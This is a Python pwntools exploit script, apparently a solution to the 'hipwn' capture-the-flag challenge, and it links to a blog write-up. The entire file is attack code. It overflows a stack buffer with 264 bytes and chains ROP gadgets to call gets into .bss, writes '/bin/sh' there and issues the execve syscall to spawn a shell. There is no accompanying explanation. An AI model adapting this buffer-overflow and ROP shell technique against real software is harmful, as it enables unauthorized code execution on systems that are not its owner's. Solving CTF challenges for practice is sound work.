# https://blog.y2a.dev/articles/2022/05-03/hipwn/
from pwn import *

file = "./chall"
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)
elf = ELF(file)

rop_pop_rdi = 0x0040141c
rop_pop_rax = 0x00400121
rop_pop_rsi_r15 = 0x0040141a
rop_pop_rdx = 0x004023f5
addr_gets = 0x004004ee
rop_syscall = 0x004024dd

pld = b""
pld += b"A"*264
# get(bss)
pld += p64(rop_pop_rdi)
pld += p64(elf.bss())
pld += p64(addr_gets)
# execve(.bss, 0, 0)
pld += p64(rop_pop_rdi)
pld += p64(elf.bss()) #Line37 Input "/bin/sh"
pld += p64(rop_pop_rsi_r15)
pld += p64(0)
pld += p64(0)
pld += p64(rop_pop_rdx)
pld += p64(0)
pld += p64(rop_pop_rax)
pld += p64(59) # SYS_execve
pld += p64(rop_syscall)

io.sendlineafter("name?", pld)
io.sendline("/bin/sh\x00")

io.interactive()
